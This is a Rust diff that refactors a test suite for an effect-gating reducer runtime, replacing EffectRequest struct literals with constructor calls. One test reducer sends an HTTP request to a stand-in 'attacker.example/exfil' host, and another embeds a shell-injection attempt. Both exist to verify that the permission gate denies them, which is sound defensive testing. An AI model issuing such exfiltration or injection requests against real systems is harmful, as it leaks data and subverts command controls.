@@ -29,12 +29,12 @@ impl Reducer for TwoStepReducer {
         match &event.body {
             EventBody::Inbound { .. } => {
                 kv.put(b"phase".to_vec(), b"fetching".to_vec());
-                FoldOutput::with(vec![EffectRequest {
-                    kind: EffectKind::Http,
-                    target: "https://ok.host/step1".into(),
-                    payload: None,
-                    timeliness: Timeliness::Interactive,
-                }])
+                FoldOutput::with(vec![EffectRequest::new(
+                    EffectKind::Http,
+                    "https://ok.host/step1",
+                    None,
+                    Timeliness::Interactive,
+                )])
             }
             EventBody::EffectResult {
                 result: EffectOutcome::Ok(_),
@@ -44,12 +44,12 @@ impl Reducer for TwoStepReducer {
                 match kv.get(b"phase") {
                     Some(b"fetching") => {
                         kv.put(b"phase".to_vec(), b"step2".to_vec());
-                        FoldOutput::with(vec![EffectRequest {
-                            kind: EffectKind::Http,
-                            target: "https://ok.host/step2".into(),
-                            payload: None,
-                            timeliness: Timeliness::Interactive,
-                        }])
+                        FoldOutput::with(vec![EffectRequest::new(
+                            EffectKind::Http,
+                            "https://ok.host/step2",
+                            None,
+                            Timeliness::Interactive,
+                        )])
                     }
                     Some(b"step2") => {
                         kv.put(b"phase".to_vec(), b"done".to_vec());
@@ -172,12 +172,12 @@ async fn denied_effect_is_logged_and_never_executed() {
     impl Reducer for Exfil {
         async fn fold_async(&self, event: &Event, _kv: &mut Kv) -> FoldOutput {
             if matches!(event.body, EventBody::Inbound { .. }) {
-                FoldOutput::with(vec![EffectRequest {
-                    kind: EffectKind::Http,
-                    target: "https://attacker.example/exfil".into(),
-                    payload: None,
-                    timeliness: Timeliness::Interactive,
-                }])
+                FoldOutput::with(vec![EffectRequest::new(
+                    EffectKind::Http,
+                    "https://attacker.example/exfil",
+                    None,
+                    Timeliness::Interactive,
+                )])
             } else {
                 FoldOutput::none()
             }
@@ -268,12 +268,12 @@ async fn timeout_cancels_so_a_late_result_is_dropped() {
     impl Reducer for CountResumes {
         async fn fold_async(&self, event: &Event, kv: &mut Kv) -> FoldOutput {
             if matches!(event.body, EventBody::Inbound { .. }) {
-                return FoldOutput::with(vec![EffectRequest {
-                    kind: EffectKind::Http,
-                    target: "https://ok.host/slow".into(),
-                    payload: None,
-                    timeliness: Timeliness::Interactive,
-                }]);
+                return FoldOutput::with(vec![EffectRequest::new(
+                    EffectKind::Http,
+                    "https://ok.host/slow",
+                    None,
+                    Timeliness::Interactive,
+                )]);
             }
             if let EventBody::EffectResult {
                 result: EffectOutcome::Ok(_),
@@ -324,12 +324,12 @@ async fn time_out_effect_settles_an_open_dispatch_and_resumes_the_reducer() {
     impl Reducer for GiveUpOnTimeout {
         async fn fold_async(&self, event: &Event, kv: &mut Kv) -> FoldOutput {
             match &event.body {
-                EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest {
-                    kind: EffectKind::Http,
-                    target: "https://ok.host/slow".into(),
-                    payload: None,
-                    timeliness: Timeliness::Interactive,
-                }]),
+                EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest::new(
+                    EffectKind::Http,
+                    "https://ok.host/slow",
+                    None,
+                    Timeliness::Interactive,
+                )]),
                 EventBody::EffectResult {
                     result: EffectOutcome::TimedOut,
                     ..
@@ -517,12 +517,12 @@ async fn a_reducers_continuation_token_is_recorded_in_the_dispatched_frame() {
         async fn fold_async(&self, event: &Event, _kv: &mut Kv) -> FoldOutput {
             if matches!(event.body, EventBody::Inbound { .. }) {
                 FoldOutput::with_effects(vec![Effect {
-                    request: EffectRequest {
-                        kind: EffectKind::Http,
-                        target: "https://ok.host/x".into(),
-                        payload: None,
-                        timeliness: Timeliness::Interactive,
-                    },
+                    request: EffectRequest::new(
+                        EffectKind::Http,
+                        "https://ok.host/x",
+                        None,
+                        Timeliness::Interactive,
+                    ),
                     token: Some(b"guest-cont-42".to_vec()),
                 }])
             } else {
@@ -594,12 +594,12 @@ async fn a_continuation_token_rides_timer_fired_and_authz_denied_events() {
             match &event.body {
                 // Inbound: arm a timer WITH a continuation token.
                 EventBody::Inbound { .. } => FoldOutput::with_effects(vec![Effect {
-                    request: EffectRequest {
-                        kind: EffectKind::Timer,
-                        target: "1000".into(), // absolute deadline ms
-                        payload: None,
-                        timeliness: Timeliness::Interactive,
-                    },
+                    request: EffectRequest::new(
+                        EffectKind::Timer,
+                        "1000", // absolute deadline ms
+                        None,
+                        Timeliness::Interactive,
+                    ),
                     token: Some(b"timer-cont-7".to_vec()),
                 }]),
                 _ => FoldOutput::none(),
@@ -656,12 +656,12 @@ async fn a_continuation_token_rides_timer_fired_and_authz_denied_events() {
         async fn fold_async(&self, event: &Event, _kv: &mut Kv) -> FoldOutput {
             if matches!(event.body, EventBody::Inbound { .. }) {
                 FoldOutput::with_effects(vec![Effect {
-                    request: EffectRequest {
-                        kind: EffectKind::Http,
-                        target: "https://denied.host/x".into(),
-                        payload: None,
-                        timeliness: Timeliness::Interactive,
-                    },
+                    request: EffectRequest::new(
+                        EffectKind::Http,
+                        "https://denied.host/x",
+                        None,
+                        Timeliness::Interactive,
+                    ),
                     token: Some(b"denied-cont-9".to_vec()),
                 }])
             } else {
@@ -717,12 +717,12 @@ async fn s1_route_guard_does_not_perform_an_effect_whose_dispatch_failed_to_pers
     impl Reducer for OneShot {
         async fn fold_async(&self, event: &Event, _kv: &mut Kv) -> FoldOutput {
             if matches!(event.body, EventBody::Inbound { .. }) {
-                FoldOutput::with(vec![EffectRequest {
-                    kind: EffectKind::Http,
-                    target: "https://ok.host/x".into(),
-                    payload: None,
-                    timeliness: Timeliness::Interactive,
-                }])
+                FoldOutput::with(vec![EffectRequest::new(
+                    EffectKind::Http,
+                    "https://ok.host/x",
+                    None,
+                    Timeliness::Interactive,
+                )])
             } else {
                 FoldOutput::none()
             }
@@ -924,12 +924,12 @@ struct TimerReducer {
 impl Reducer for TimerReducer {
     async fn fold_async(&self, event: &Event, kv: &mut Kv) -> FoldOutput {
         match &event.body {
-            EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest {
-                kind: EffectKind::Timer,
-                target: self.deadline_ms.to_string(), // absolute deadline ms (§16c-S5)
-                payload: None,
-                timeliness: Timeliness::Interactive,
-            }]),
+            EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest::new(
+                EffectKind::Timer,
+                self.deadline_ms.to_string(), // absolute deadline ms (§16c-S5)
+                None,
+                Timeliness::Interactive,
+            )]),
             EventBody::TimerFired { .. } => {
                 kv.put(b"woke".to_vec(), b"1".to_vec());
                 FoldOutput::none()
@@ -1055,12 +1055,12 @@ async fn malformed_timer_deadline_is_rejected_not_panicked() {
     impl Reducer for BadTimer {
         async fn fold_async(&self, event: &Event, _kv: &mut Kv) -> FoldOutput {
             if matches!(event.body, EventBody::Inbound { .. }) {
-                FoldOutput::with(vec![EffectRequest {
-                    kind: EffectKind::Timer,
-                    target: "not-a-number".into(),
-                    payload: None,
-                    timeliness: Timeliness::Interactive,
-                }])
+                FoldOutput::with(vec![EffectRequest::new(
+                    EffectKind::Timer,
+                    "not-a-number",
+                    None,
+                    Timeliness::Interactive,
+                )])
             } else {
                 FoldOutput::none()
             }
@@ -1095,12 +1095,12 @@ async fn live_shell_executor_runs_a_real_command_end_to_end() {
     impl Reducer for ShellReducer {
         async fn fold_async(&self, event: &Event, kv: &mut Kv) -> FoldOutput {
             match &event.body {
-                EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest {
-                    kind: EffectKind::Shell,
-                    target: "echo hi".into(),
-                    payload: None,
-                    timeliness: Timeliness::Interactive,
-                }]),
+                EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest::new(
+                    EffectKind::Shell,
+                    "echo hi",
+                    None,
+                    Timeliness::Interactive,
+                )]),
                 EventBody::EffectResult { result, .. } => {
                     match result {
                         EffectOutcome::Ok(Some(Payload::Inline(bytes))) => {
@@ -1153,14 +1153,14 @@ async fn live_shell_denied_command_never_executes() {
     impl Reducer for DeniedShell {
         async fn fold_async(&self, event: &Event, _kv: &mut Kv) -> FoldOutput {
             if matches!(event.body, EventBody::Inbound { .. }) {
-                FoldOutput::with(vec![EffectRequest {
-                    kind: EffectKind::Shell,
-                    // Harmless command (PR#992 #3: no `rm -rf` in tests). Outside the `echo ` grant →
-                    // denied at the gate anyway; the marker would only appear if the gate FAILED.
-                    target: format!("touch {}", self.0),
-                    payload: None,
-                    timeliness: Timeliness::Interactive,
-                }])
+                // Harmless command (PR#992 #3: no `rm -rf` in tests). Outside the `echo ` grant →
+                // denied at the gate anyway; the marker would only appear if the gate FAILED.
+                FoldOutput::with(vec![EffectRequest::new(
+                    EffectKind::Shell,
+                    format!("touch {}", self.0),
+                    None,
+                    Timeliness::Interactive,
+                )])
             } else {
                 FoldOutput::none()
             }
@@ -1214,13 +1214,13 @@ async fn live_shell_no_injection_via_metacharacters() {
     impl Reducer for Injector {
         async fn fold_async(&self, event: &Event, kv: &mut Kv) -> FoldOutput {
             match &event.body {
-                EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest {
-                    kind: EffectKind::Shell,
-                    // Passes `starts_with("echo ")` but embeds an injection attempt.
-                    target: self.0.clone(),
-                    payload: None,
-                    timeliness: Timeliness::Interactive,
-                }]),
+                // Passes `starts_with("echo ")` but embeds an injection attempt.
+                EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest::new(
+                    EffectKind::Shell,
+                    self.0.clone(),
+                    None,
+                    Timeliness::Interactive,
+                )]),
                 EventBody::EffectResult {
                     result: EffectOutcome::Ok(Some(Payload::Inline(b))),
                     ..
@@ -1268,12 +1268,13 @@ async fn authz_denied_is_folded_live_so_replay_matches() {
     impl Reducer for DenialCounter {
         async fn fold_async(&self, event: &Event, kv: &mut Kv) -> FoldOutput {
             match &event.body {
-                EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest {
-                    kind: EffectKind::Http,
-                    target: "https://denied.host/x".into(), // outside the capability → denied
-                    payload: None,
-                    timeliness: Timeliness::Interactive,
-                }]),
+                // Target outside the capability → denied.
+                EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest::new(
+                    EffectKind::Http,
+                    "https://denied.host/x",
+                    None,
+                    Timeliness::Interactive,
+                )]),
                 EventBody::AuthzDenied { .. } => {
                     let n = kv.get(b"denials").map(|b| b[0]).unwrap_or(0) + 1;
                     kv.put(b"denials".to_vec(), vec![n]);
